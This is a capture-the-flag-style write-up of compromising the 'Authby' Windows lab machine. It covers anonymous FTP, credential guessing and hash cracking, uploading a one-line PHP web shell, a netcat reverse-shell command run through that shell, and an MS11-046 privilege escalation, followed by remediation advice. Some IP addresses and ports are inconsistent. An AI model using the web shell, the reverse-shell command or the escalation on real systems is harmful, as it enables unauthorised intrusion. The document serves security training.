---
Alias: Authby
Date: 6/22/22
Platform: Windows
Difficulty: Intermediate
Tags: #simplephpbackdoorRCE #MS11-046 #.htaccess #rootdirectorylocationsWWW #rootdirectorylocationsHTDOCS #rootdirectorylocationsPUBLIC_HTML
Status: Finished
IP: 192.168.100.46
---

# {{Authby}}


# Resolution summary
- Gained access to an anonymous FTP server login and obtained a username
- Guessed the password for the discovered user in order to access the FTP server.
- Found the hashed password and username
- Discovered that the WordPress site's root directory contained the ftp directory.
- John was used to crack the user's hashed password.
- Accessed the login page on port 242
- Uploaded a simple PHP backdoor script to the WordPress site's root directory on the FTP server.
- Confirmed RCE
- Uploaded a netcat binary to FTP server 
- Received a command prompt 
- Found system was not patched for vulnerability MS11-046 
- After transferring the compiled MS11-046 binary onto the system and executing the exploit, a CMD executing as nt authority\system was obtained.
- 
## Improved skills
- Password guessing
- Discovered that the root directory of WordPress sites has a.htaccess file.
- Acquired knowledge (based on the hosting provider)  A folder with the name public_html, www, htdocs, or httpdocs may be the root directory.

## Used tools
- rustscan
- john

### **Initial Access Vulnerability Explanation:** 
#### 1. Anonymous FTP Acccess
#### 2. Writable Root Directory to a Web Server


### **Initial Access Vulnerability Explanation:** 

#### 1. Anonymous FTP Acccess

Anonymous FTP access allows unauthenticated users to access the FTP server, potentially exposing sensitive files and directories to unauthorized parties. This can lead to information disclosure and unauthorized access to critical system files.

### **Initial Access Vulnerability Explanation:** 
#### 2. Writable Root Directory to a Web Server

A writable root directory to a web server allows an attacker to modify files or scripts in critical system directories. If a web server has write access to its root directory (or other system directories), malicious users can inject or modify files, potentially gaining complete control over the server, compromising sensitive data, or executing arbitrary code.

### **Initial Access Vulnerability Fix:** 

#### 1. Anonymous FTP Access

To mitigate this vulnerability, disable anonymous FTP access on the server and require authentication for all FTP sessions. Properly configure file permissions to ensure that only authorized users can read or write files. Regularly audit FTP logs for any suspicious activities and apply encryption protocols like FTPS or SFTP to secure data transmission.

### **Initial Access Vulnerability Fix:** 

#### 2. Writable Root Directory to a Web Server

To mitigate this risk, ensure that the root directory is not writable by non-administrative users. Properly configure file permissions so that only authorized personnel can write to specific directories. Implement access control mechanisms, restrict write access to essential directories, and regularly audit file permissions to prevent misconfigurations.

### **Privilege Escalation Vulnerability Explanation:** 

#### MS11-046

The MS11-046 vulnerability pertains to a flaw in the Windows Ancillary Function Driver (AFD), which is a part of the Windows operating system kernel that provides support for Windows Sockets applications to perform various network operations. This vulnerability allows an authenticated local user to elevate their privileges on a Windows system. Successful exploitation of this vulnerability could allow an attacker to execute code with elevated privileges, enabling full control over the affected system. This issue is due to improper management of objects in memory by the AFD, which could be exploited via a specially crafted application.

### **Privilege Escalation Vulnerability Fix:** 

#### MS11-046

To mitigate MS11-046, apply the official Microsoft security patch for the vulnerability. Additionally, restrict user access to sensitive kernel-mode resources and regularly update the operating system to ensure all security patches are applied. Limiting the use of kernel-mode drivers that are unnecessary can also reduce the potential attack surface.

---

# Information Gathering
Scanned all TCP ports:
```bash
ustscan -a 192.168.100.46 --ulimit 5000                                                                                       (master✱) 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.100.46:21
Open 192.168.100.46:242
Open 192.168.100.46:3145
Open 192.168.100.46:3389
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-16 14:38 EDT
Initiating Ping Scan at 14:38
Scanning 192.168.100.46 [2 ports]
Completed Ping Scan at 14:38, 3.00s elapsed (1 total hosts)
Nmap scan report for 192.168.100.46 [host down, received no-response]
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.09 seconds


sudo nmap -sC -sV -O 192.168.100.46 -p 21,242,3145,3389                                                                        (master✱) 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-16 17:55 EDT
Nmap scan report for 192.168.100.46
Host is up (0.080s latency).

PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Jun 17 01:38 log
| ----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Sep 22  2021 accounts
242/tcp  open  http               Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
|_http-title: 401 Authorization Required
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
3145/tcp open  zftp-admin         zFTPServer admin
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2022-06-16T21:56:29+00:00
|_ssl-date: 2022-06-16T21:56:35+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=LIVDA
| Not valid before: 2022-06-15T12:28:44
|_Not valid after:  2022-12-15T12:28:44
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.24 seconds

```

Enumerated open TCP ports:
```bash
21
242
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 21

- Next, we focus on gaining access to the FTP server. We are able to log in anonymously and retrieve username admin.

![](Images/Pasted%20image%2020221001114759.png)

- Next, we guess the user admin password and use the following credentials to access the user's FTP server:
  
username: admin
password: admin

![](Images/Pasted%20image%2020221001114845.png)

- We locate the hashed password for offsec and the username offsec in file .htpasswd after downloading the discovered files to our Kali machine.

![](Images/Pasted%20image%2020221001114935.png)

- The FTP directory is located in the WordPress site's root directory, as indicated by the.htaccess file.

![](Images/Pasted%20image%2020221001115013.png)

![](Images/Pasted%20image%2020221001115038.png)

- The password "elite" was obtained when we used "john hash.txt - wordlist=/usr/share/wordlists/rockyou.txt" to crack the hash:

![](Images/Pasted%20image%2020221001115111.png)

## Port 242

- Next, we use the obtained credentials below to access the login page on "http://192.168.100.46:242":

username: offsec
password: elite

![](Images/Pasted%20image%2020221001115137.png)

![](Images/Pasted%20image%2020221001115213.png)


---

# Exploitation
## Simple PHP Backdoor RCE

## Port 21

- As per our earlier discoveries, the root directory contains the.htaccess file.

- On our Kali machine, we create a file called "simplephpbackdoor.php" that contains the following:

<?php system($_GET["cmd"]);?>

- Subsequently, we access the admin FTP server and upload the file simplephpbackdoor.php.

![](Images/Pasted%20image%2020221001115235.png)

## Port 242

- After that, we confirm remote code execution (RCE) by visiting the URL below:

![](Images/Pasted%20image%2020221001115307.png)

#simplephpbackdoorRCE

- We transfer a netcat binary to the FTP server.

- We launch a netcat listener on our Kali machine at port 3145.

- The reverse shell is then executed by visiting the following URL, which gives us a shell.

[http://192.168.69.46:242/simplephpbackdoor.php?cmd=](http://192.168.69.46:242/simplephpbackdoor.php?cmd=dir)nc 192.18.69.127 9090 -e cmd

![](Images/Pasted%20image%2020221001115406.png)


---

# Privilege Escalation
## Local Enumeration

- Entering “systeminfo” revealed that Windows Server 2008 was being used on the computer, and no hot fixes or updates were present:

```
Host Name:                 LIVDA
OS Name:                   Microsoftr Windows Serverr 2008 Standard 
OS Version:                6.0.6001 Service Pack 1 Build 6001
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                92573-OEM-7502905-27565
Original Install Date:     12/19/2009, 11:25:57 AM
System Boot Time:          6/22/2022, 2:20:04 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,659 MB
Page File: Max Size:       1,983 MB
Page File: Available:      1,542 MB
Page File: In Use:         441 MB
Page File Location(s):     N/A
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           N/A
```
#KernalExploitPrivilegeEscalation

- Searching for "6.0.6001 Service Pack 1 Build 6001 exploit" on Google brought to the webpage that included exploit MS11-046:

![](Images/Pasted%20image%2020221001115431.png)

![](Images/Pasted%20image%2020221001115452.png)

- We search for the exploit on Google and download the precompiled version listed below to our Kali machine.

![](Images/Pasted%20image%2020221001115515.png)

![](Images/Pasted%20image%2020221001115534.png)

## Privilege Escalation vector
## MS11-046

- We then transferred the compiled MS11–046 binary onto the target system

- A command prompt executing as nt authority\system appeared when we typed “ms11–046.exe”:

![](Images/Pasted%20image%2020221001115612.png)
![](../Images/Pasted%20image%2020220622221842.png)
